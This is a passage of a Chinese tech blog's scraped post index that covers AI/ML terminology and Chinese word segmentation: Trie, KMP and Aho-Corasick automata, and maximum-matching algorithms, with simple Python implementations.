而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","permalink":"https://vec6.com/posts/inteliigence-terms/","summary":"人工智能 人工智能是一个比较广泛的概念，这个概念实际上指的是让机器像人一样思考，其最早由计算机科学之父阿兰图灵在1950年的一篇《计算机器与智能》论文中写出“如果电脑能在5分钟能回答由人类测试者提出的一系列的问题，且超过30%回答让测试者误认为人类所答，则电脑通过测试”，这段话也直接启蒙式的开启了人工智能领域的研究。 而“人工智能”一词，第一次出现在1956年，达特茅斯大学召开的学术会议室，由人工智能之父约翰·麦卡锡首次提出。 通常人工智能被分为弱人工智能和强人工智能，前者可以让机器有一定程度的学习、理解和推理能力，后者则是由自适应能力，比如解决一些之前没有遇见过的问题，我们常在电影里看见的机器人就是一种强人工智能。\n机器学习 机器学习为人工智能的一个研究分支，也可以理解为弱人工智能的一种实现，而机器学习做的事情是让机器取模拟和实现人类的学习行为，以获得新的技能和知识。 人工智能领域的先驱Arthur Samuel在1959年给出的机器学习定义为“不直接编程，却能赋予计算机提供能力的方法”，而美国工程院院士Tom Mitchell则给出了一个更明确的含义，指出“机器学习是通过某项人物的经验数据提高了在该人物上的能力”。 机器学习最基本的是利用给出的算法来解析数据，从中学习到一定规则(模式)得到经验，并利用学习到的经验对类似的问题作出预测和判断。 而如今机器学习已在多个领域得到了很好的应用，大致上可以将机器学习的分为几个研究方向：\n模式识别 自然语言处理 数据挖掘 计算机视觉 语言识别 统计学习 算法 前面提到机器学习需要给出算法来解析（学习）数据，以获得经验，而这个算法则包括我们常说的“神经网络”也是机器学习算法的一种，常见的算法有如下：\n回归算法 神经网络算法 SVM向量机 聚类算法 降维算法 推荐算法 决策树 朴素贝叶斯 其他算法 而根据这些算法可以分为监督学习、无监督学习、半监督学习、强化学习，其中监督学习在日语中被称为“有老师的学习”，本质上是让机器学习带有“标准答案”的数据，然后再让机器学习做题，根据做题的结果对比标准答案，根据误差进行调整，经过多次反复，让机器的误差越来越小。 像上面这样在带有标签（答案）的数据上学习的过程被称为“训练”，而训练用到的数据被称为“训练集”，但也被叫做“数据集”，因为该数据集是被拿来训练的，所以被称为训练集，同样训练集在自然语言处理中被称为“语料库”。在训练集里面每一个数据被称为“样本”，在训练过程中反复针对误差作出的调整则被称为“调参”。 而训练出来的结果则为称为“模型”，模型其实也是算法，但为了区分，所以将机器学习的结果称为模型。模型可以用来针对训练集相似类型的问题去得到一个结论（值），这个过程则被称为\u0026quot;预测\u0026quot; 无监督学习在日语中被称为“没有老师的学习”，这就意味着数据不含标准答案，机器可以发现数据与数据之间的关联，但无法发现数据与答案之间的关联，常见的无监督学习算法有聚类、降维等算法。 半监督学习是利用多个模型对同一个实例进行预测，如果这些结果多数一致，则可以将这个实例和结果放在一起作为新的训练集，由于半监督学习可以利用标注数据来丰富未标注数据，所以目前正是热门的研究。 之所以半监督学习这样热门是因为带有“标准答案”的数据集几乎都是由人工整理和标注，需要大量的人力、成本、时间，也被叫为“黄金数据（Gold Data）”，所以半监督学习则可以用少量的标注数据集来得到更多的标注数据集来减少其人工、成本、时间。 强化学习针对的是需要一系列彼此关联决策的问题，比如自动驾驶、电子竞技等，这类问题往往需要一边预测，一边跟着环境的反馈规划下一次决策。\n特征工程 特征工程一般情况下分为“特征提取”和“特征模板”，特征提取指的是将我们要处理的实例转换为计算机能处理的数值类型的特征值，比如判断名字“沈雁冰”性别为例，特征提取则大概表示如下：\n特征序号 特征条件 特征值 1 是否含“雁” 1 2 是否含“冰” 1 而对于大量的数据进行手动的特征提取是不太现实的，而需要定义一套特征模板来进行提取，比如一大堆的姓名数据，表示为name，那么可以定义name[1]+name[2]这样的特征模板，然后通过这个模板在相同类的样本中遍历组合则这一类的数据基本上各种情况的特征基本上覆盖完了。\n深度学习 深度学习本质就是为神经网络算法，在2006年人工智能专家Geoffrey Hinton等人研究出一个名为“深度信念网络”，率先使用了“深度”一词，他们在这里面引入了一个叫“Greedy layer wise pre-training”策略，而其他研究者发现这个策略对于训练深层的神经网络很有效果，所以深层神经网络也叫深度学习。\n参考文章 什么是机器学习？ 人工智能、机器学习、深度学习、神经网络概念说明 神经网络啥时候改名叫“深度学习”了？ 深度学习和人工智能之间是什么样的关系？ 《自然语言处理入门》 ","title":"人工智能基础名词理解"},{"content":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self._children # 同样设置一个child变量，用于控制当前的字符对象 for char in word: child = child.get(char) if child is None : # 只要其中一个没有查找到，那么说明匹配识别，则返回False return False return child[\u0026#39;__value\u0026#39;] # 如果没有匹配失败则返回特殊__value的值 #回True表示词典中存在该词，返回False表示不存在或者传递进来的词不成词 将Trie实现后，就可以在正向或者反向等算法中来进行使用，从而提高运算的效率，但是使用Trie树的时候，可能无法动态的计算其词的长度，所以根据上一篇文章当中修改的最大正向匹配算法的长度计算我手动计算填写。 下面的代码是基于《[一]漫话中文分词：最大匹配,双向最大,最小词数》文章中的最大正向匹配算法，但其中的词典则是使用Trie结构，改动了两处：\ntrie = Trie() trie._add_word(\u0026#39;分词\u0026#39;) sentence = \u0026#39;中文分词算法\u0026#39; start = 0 maxWidth = 2 # 改动1：手动填写最大长度 cut_result = [] while (start \u0026lt;= len(sentence)): end = start + maxWidth word = sentence[start: end] while ( word ) : if ( trie._get_word(word) ) : # 改动2：利用Trie的查询函数，该返回查询到为词则返回True，否则False cut_result.append(word) start = start + len(word) - 1 break if (len(word[:-1]) == 0): cut_result.append(word) break word = word[:-1] start = start + 1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] KMP算法 高效的数据结构有了，然而还可以更近一步，在Trie结构的基础上采用一些高效的查询算法，比如下面的AC自动机，在了解AC自动机之前，可以先了解一下KMP算法，虽然了解AC自动机不需要了解KMP算法就可以理解，但是理解了KMP算法过后，实际上会更容易理解AC自动机。 KMP算法于1977年由James H. Morris](https://en.wikipedia.org/wiki/James_H._Morris)、Donald Knuth、Vaughan Pratt三位发明者联合发表，其算法名称KMP是由三位发明者首字母命名。 KMP算法其核心主要为利用已匹配字符串中的已知信息来减少无效匹配的次数，从而提升查找的效率。首先可以来看看普通查找方式，找到一个字符串在另外一个字符串中出现的位置该怎么来匹配。 比如搜索词ABABC，需要查找在文本ABABABC中出现的位置，那么按照常规的方式应该首先第一个字符，是否相等：\n如果第一个字符相等，那么继续匹配第二个字符，查看第二个字符是否相等：\n如果第二字符相等再匹配下一个字符是否相等，一直匹配，直到第五个字符出现了问题，不相等：\n此时，将搜索词的位置往后移动一位，即搜索词的第一个字符从文本的第二个字符开始匹配：\n移动过后，第一位不匹配，那么继续将模式串移动一位，将模式串第一个字符对准字符串第三个字符，继续重新匹配，第一次匹配：\n第一次匹配成功，继续第二位，第三位匹配，一直遍历匹配到搜索词最后一个字符成功，那么整个搜索结束，并返回该搜索词第一次出现的位置为文本的第三位。\n从上面的例子来看，第二次明显属于无效匹配，如果在大量的文本中搜索词的话，会造成更多这样的无效匹配出现，而KMP算法就是解决这样的问题，用来减少无效的匹配次数，从而来增加匹配的效率。 KMP算法首先需要维护一个特殊的表，名字为部分匹配表或者失配函数，这个表由非负数数值构成，并且搜索词的字符都会对应一个数值，大概为下面这样：\n关于这个值是如何计算的先不用管，先看看如何使用这个值来跳过无效的匹配，还是拿刚刚例子，搜索词ABABC，文本ABABABC，首先进行第一次匹配：\n第一次匹配成功，进入第二次匹配：\n第二次匹配成功，重复该动作，直到匹配到第五次出现了问题，此时搜索词第五位的C和文本的第五位A不相等，此时KMP算法中的部分匹配表就派上了用场，可以通过该表计算出需要搜索词下一个开始匹配的位置是从什么地方开始，这样就可以跳过无效匹配位的值。其计算公式为：\n位移值 = 成功匹配的数量 - 匹配失败位前一位在部分匹配表中的值 因为匹配失败的位置是在第五位，那么获取部分匹配表中的值应该位前一位的值，通过查询下图得到数值2，然后匹配成功的字符数量为4，最后相减得到2。\n从上面得到数值后，就可以将搜索词当前开始的位置加2，因为此时的搜索词开始的位置是文本的第1位，那么加上后得到3，就意味着搜索词的第一位对应着文本的第三位：\n而通过KMP的算法就可以跳过对应普通查找方法的第二次匹配，这在大量的文本搜索当中提升是非常显著的，但是怎么来计算部分匹配表的中的值？ 部分匹配表指的是最长相同字符的长度，要计算部分匹配表首先需要知道前缀和后缀的概念，前缀指的是除了字符串第一个字符之外的所有字符串头部集合，而后缀指的是除了字符串最后一个字符之外的所有后部集合。 比如说单词home，其前后缀集合为：\n前缀集合为：{h, ho, hom} 后缀集合为：{ome, me, e} 而部分匹配表需要对每一位进行计算相应的值，而在搜索词的每一位取的范围字符为前面所有字符，比如ABABC，计算第一位因为前面没有字符，所以取的范围仅为A。到第二位则包含前面所有字符，所以等于AB。第三位则为ABA以此类推 再回到上面例子中，搜索词ABABC，其计算部分匹配表的过程为：\nA：前后缀都为空，则值为0 AB：前缀为{A},后缀为{B},没有相同的字符，部分匹配表中的值为0 ABA：前缀为{A, AB},后缀为{BA, A}，其中有字符A交集，其长度为1，部分匹配表中的值为1 ABAB：前缀为{A,AB,ABA},后缀为{BAB,AB,B}，有相同字符AB，长度为2，部分匹配表中的值为2 ABABC：前缀为{A,AB,ABA,ABAB},后缀为{BABC,ABC,BC,C}，没有相同字符，部分匹配表中的值为0 AC自动机 AC自动机(Aho-Corasick automaton)是一种基于Trie树进行匹配的一种字符串搜索算法，在1975年由Alfred V. Aho和Margaret J.Corasick发明，该算法其实和KMP算法并无太大的关联，KMP算法是1对1（一个搜索词匹配一个文本）进行搜索，而AC自动机则是1对多（多个搜索词匹配一个文本）进行搜索。 AC自动机对比Trie树的优点在于Trie树每次匹配后进行下一个字符查找的时候都需要回到顶点继续再搜索，而AC自动机则是将该文本中的字符串搜索一次性完成。 AC自动机核心是利用一个叫fail指针(失败指针)的东西，fail指针主要的用途是如果当前字符在当前节点的子元素中没有找到，那么就利用fail指针指向另外一个节点继续搜索，直到搜索完成，下图中的红线就是一个fail指针。\n比如单词列表为['he', 'hers', 'his', 'she']，待分词文本为hershe，正常Trie匹配为先找到he，然后字符r再从0开始匹配，此时r没有在顶层节点的子节点当中，所以跳过，继续查找，直到找到了she完成。 而AC自动机的算法则为当找到了he单词后，继续在当前节点的子节点当中搜索字符r，如果有继续搜索下一个字符s，然后得到单词信息hers，然后继续搜索字符h，此时搜索位置为下图红色节点位置，但该节点下没有h：\n这个时候就查看当前节点（即红色节点）的fail指针(红线)指向的节点下是否有字符h，此时发现有，则通过fail指针继续查找，直到找到了单词she。 AC自动机的理念是比较好理解，而难点在于如何计算fail指针指向谁，计算fail指针可以通过BFS（层次遍历），BFS将Trie每一层进行遍历，遍历的时候将计算所有子节点的fail指针，并将子节点放入到一个先进先出容器当中（队列）便于访问子节点的子节点。 而计算fail指针的时候一定是当前字符不存在于当前节点的子节点当中，所以查找当前节点的子节点的fail指针的时候，可以通过将当前节点的子节点中的所有fail指针都可以获取到所有父节点的fail指针，然后一层一层的找，如果找到后就指向谁，如果没有找到则指向最顶层。 下面是实现的代码：\nclass TrieNode(object): def __init__(self) -\u0026gt; None: self._children = {} self._fail = None self._exist = [] def _add_child(self, char, value, overwrite = None): child = self._children.get(char) if child is None: child = TrieNode() self._children[char] = child if overwrite: child._exist.append(value) return child class Trie(TrieNode): def __init__(self) -\u0026gt; None: super().__init__() def _find_text(self, text): state = self cut_word = [] for i,t in enumerate(text): while state._children.get(t) is None and state._fail: state = state._fail if state._children.get(t) is None: continue state = state._children.get(t) if len(state._exist) != 0: for x in state._exist: max_cut = text[i - x + 1:i + 1] cut_word.append(max_cut) return cut_word def __setitem__(self, key, value): state = self for char in key: if char == key[-1] : state = state._add_child(char, len(value), True) break state = state._add_child(char, None, False) def _init_fail(self): q = queue.Queue() for i in self._children: state = self._children.get(i) state._fail = self q.put(state) while q.empty() == False: state = q.get() for i in state._children: v = state._children.get(i) fafail = state._fail while fafail is not None and fafail._children.get(i) is not None: fafail = fafail._children.get(i) v._fail = fafail if v._fail: if len(fafail._exist) != 0: v._exist.extend(v._fail._exist) q.put(v) 参考文档 如何更好地理解和掌握 KMP 算法? KMP算法-维基百科 字符串匹配的KMP算法\n","permalink":"https://vec6.com/posts/chinesecutwords-2/","summary":"Trie树 在上一篇文章当中，说到了一些匹配的算法，但是算法有了，还得需要一个高效的数据结构，不能只是通过[\u0026lsquo;中国人\u0026rsquo;, \u0026lsquo;中东人\u0026rsquo;]等结构来进行存放，可以想象一下，如果有几十万的词，那么这个列表的占用的内存非常大。 Trie树，也被称为前缀树，该词源自单词retrieval，发音和try相同，Trie树可为词库提供一种高效的分词数据结构，该结构本质上是一种树状数据结构，比如\u0026quot;中国人\u0026quot;、\u0026ldquo;中东人\u0026quot;三个字符串构造的Trie树为下图，图中能够很清楚的看见，Trie树结构能够很好的节省相同前缀单词所浪费的空间，因为这两个词都是以\u0026quot;中\u0026quot;开头，所以可以使用同一个父辈节点。\n除此之外，Trie树还对查询的速度有一定的优化，如果以列表存放词来说，如果列表存放的词达到了20万个，那么最坏的情况是你需要匹配的词在存放于列表最后，那么就相当于要将这20万个词全部遍历，可想而知浪费了非常多的计算资源。 而Trie查询的次数最大的次数取决于查找的字符串长度，比如中国人，那么查询次数最大仅为3次。 下图为基于同一份10万左右的词典，待分词文本为字符长度150，使用正向最大匹配算法在列表和Trie两种结构上进行分词的运行时间，从下图可以看出来差距非常大。\nTrie树的查找方式则是通过层层查询，而不是直接遍历词典，比如\u0026quot;中国人\u0026rdquo;，首先会查找第一层中是否有\u0026quot;中\u0026quot;这个字符，如果没有查询到则返回查询失败，如果有则继续查找\u0026quot;中\u0026quot;字符对应的下一层是否有\u0026quot;国\u0026quot;，如果没有则返回查询识别，如果有则继续查找\u0026quot;国\u0026quot;下一层是否有\u0026quot;人\u0026quot;，此时找到存在\u0026quot;人\u0026quot;这个节点，并且该节点标注为蓝色，表明是一个词，所以返回该字符串为一个词。 其实要实现这样的数据结构，大致的功能点为下面两点：\n查询词 添加词 除此之外还需要考虑如果标记词的结束节点，首先可以约定，默认情况都返回\u0026quot;False\u0026quot;表示为未查询到或设置失败，而返回\u0026quot;True\u0026quot;则表示查询到或设置成功，每个节点为一个字符，而字典当中的__value表示是否为结束节点（即一个词的尾字符），如果是则为True，不是则为False，整体可以采用函数或者类来定义。 实现代码：\nclass Trie(): #定义一个Trie类型 def __init__(self): #为这个生成的实例定义一个名为_children的对象，用于存放词的Trie结构 self._children = {} def _add_word(self, word): # 定义一个添加词的实例方法 child = self._children # 首先会将_children的对象赋值给child for i,char in enumerate(word): # 然后从头遍历添加词的每一个字符 if char not in child: # 查看当前字符是否存在Trie树上 child[char] = {\u0026#39;__value\u0026#39;: False} # 如果没有则新建一个对象，并设置特殊key__value为False，表明这不是一个结尾字符 if i == (len(word) - 1): # 判断是否为结尾字符 child[char][\u0026#39;__value\u0026#39;] = True # 如果是则将特殊key：__value设为True，表明为结尾字符 child = child[char] # 如果还有字符，则将当前字符对象更新为child，那么下一次查找则是基于上一次对象下 return True # 添加完成返回True def _get_word(self, word): # 查找词 child = self.","title":"(二)漫话中文分词：Trie、KMP、AC自动机"},{"content":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.append(word) start = start + len(word) - 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word[:-1]) == 0): cut_result.append(word) # 如果最后一个字符也没有被匹配到，那么返回最后一个字符 break word = word[:-1] # 将word去掉最后一个字符串并重新计算 start = start + 1 # 将位置加1 print(cut_result) #[\u0026#39;中\u0026#39;, \u0026#39;文\u0026#39;, \u0026#39;分词\u0026#39;, \u0026#39;算\u0026#39;, \u0026#39;法\u0026#39;] 反向最大匹配算法（Backward Maximum Matching） 反向最大匹配算法与正向最大匹配算法是相反的，比如\u0026quot;中文分词算法\u0026quot;文本的正向最大匹配算法在切分宽度为2的时候，是从\u0026quot;中文\u0026quot;开始切分的，而反向则是从\u0026quot;算法\u0026quot;开始切分的。 除了反向的切分，其中对于切分块内的文本依次去掉最后一个字符也变为了依次去掉第一个字符，比如正向第一个切分块\u0026quot;中文\u0026quot;后，如果没有匹配到，则去掉\u0026quot;文\u0026quot;，再对\u0026quot;中\u0026quot;字符进行匹配，而反向则是拿到\u0026quot;算法\u0026quot;后，如果没有匹配到，则是去掉\u0026quot;算\u0026quot;，再对\u0026quot;法\u0026quot;进行匹配。 反向最大匹配算法对比于正向最大匹配算法来说，可以解决一定的交集型歧义，比如本文\u0026quot;他说的确实在理\u0026quot;，理想情况下希望的分词结果中包含\u0026quot;确实\u0026quot;这一词，而正向最大匹配算法结果为\u0026quot;他/说/的确/实/在理\u0026quot;，而反向最大匹配算法的结果为\u0026quot;他/说/的/确实/在理\u0026quot;。 这两种方式很难区分到底谁好谁坏，比如上面的问题中，如果你希望的分词为\u0026quot;的确\u0026quot;，但是如果使用反向的话就很难被分出来。 反向最大匹配算法具体的实现代码：\nsentence = \u0026#39;他说的确实在理\u0026#39; # 输入的句子 cutList = [\u0026#39;的确\u0026#39;, \u0026#39;确实\u0026#39;] # 分词词典 start = len(sentence) #设置切分起始位置为该文本的最后一个字符 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026gt; 0): #开始循环，如果start大于等于句子长度则停止分词 end = start - maxWidth # 计算结束位置，结束位置为开始位置减去宽度 word = sentence[end: start] # 开始切分，文本为变量end和start的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.insert(0,word) start = start - len(word) + 1 # 然后将开始位置设置为当前开始位置加上被匹配词的长度 break if (len(word) == 1): cut_result.insert(0, word) # 返回最后一个字符 break word = word[1:] # 将word去掉第一个字符串并重新计算 start = start - 1 # 将位置减1 cut_result.insert(0, sentence[0]) # 将剩余的第一个字符添加进结果 print(cut_result) #[\u0026#39;他\u0026#39;, \u0026#39;说\u0026#39;, \u0026#39;的\u0026#39;, \u0026#39;确实\u0026#39;, \u0026#39;在\u0026#39;, \u0026#39;理\u0026#39;] 双向最大匹配算法（Bidirectional Maximum Match） 双向最大匹配算法是将正向和反向结果的颗粒度进行比较的一种算法，本质上是一种规则系统，该规则为如下：\n返回词数最少的结果 返回单字词更少的结果 如果两则都相同优先返回反向最大匹配算法结果 因为双向最大匹配算法实际上是一种规则系统，只需要对结果进行判断优先返回哪种结果，所以这里就不过多的说明。但需要注意的是采用双向最大匹配算法实际上运行了两种算法，所以对于运算量来说是双倍。\n最少词数算法（Minimal Word Count） 最少词数算法也被称为最少切分算法，最少词数算法的本质是将一段文本分词的结果最少，最少次数算法整个过程是将字典按照长度进行排序，首先对最长的字典中的词进行匹配字符串，如果有则切分，并继续匹配下一个字典中的词，如果没有则继续匹配按照顺序匹配。 比如\u0026quot;独立自主和平等互利的原则\u0026quot;，正向匹配的结果为\u0026quot;独立自主/和平/等/互利/的/原则\u0026quot;，而最少词数的结果\u0026quot;独立自主/和/平等互利/的/原则\u0026quot;。 下面为一个非常简单的实现：\nsentence = \u0026#39;独立自主和平等互利的原则\u0026#39; # 输入的句子 cutList = [\u0026#39;独立自主\u0026#39;, \u0026#39;平等互利\u0026#39;, \u0026#39;独立\u0026#39;, \u0026#39;自主\u0026#39;, \u0026#39;和平\u0026#39;, \u0026#39;平等\u0026#39;, \u0026#39;互利\u0026#39;, \u0026#39;原则\u0026#39;] # 分词词典 cutList = sorted(cutList, key=len, reverse=True) # 字典排序 for cut in cutList: 